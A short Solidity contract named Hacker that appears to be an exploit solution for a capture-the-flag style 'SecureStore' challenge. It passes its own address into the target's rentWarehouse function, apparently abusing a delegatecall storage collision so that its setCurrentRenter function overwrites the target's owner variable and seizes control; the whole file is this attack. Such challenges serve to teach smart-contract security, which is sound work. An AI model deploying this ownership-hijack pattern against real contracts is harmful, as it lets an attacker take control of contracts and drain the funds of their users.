pragma solidity 0.8.13;

import "hardhat/console.sol";

interface ISecureStore {
    function rentWarehouse(uint256, uint256) external;

    function withdrawAll() external;
}

contract Hacker {
    address public useless;
    address public Owner;

    ISecureStore store;

    constructor(address _store) {
        store = ISecureStore(_store);
        Owner = payable(msg.sender);
    }

    function attack() external {
        store.rentWarehouse(0, uint160(address(this)));
    }

    function setCurrentRenter(uint256 _renterId) external {
        console.log("Owner is", Owner);
        Owner = msg.sender;
        console.log("Owner is", Owner);
    }
}
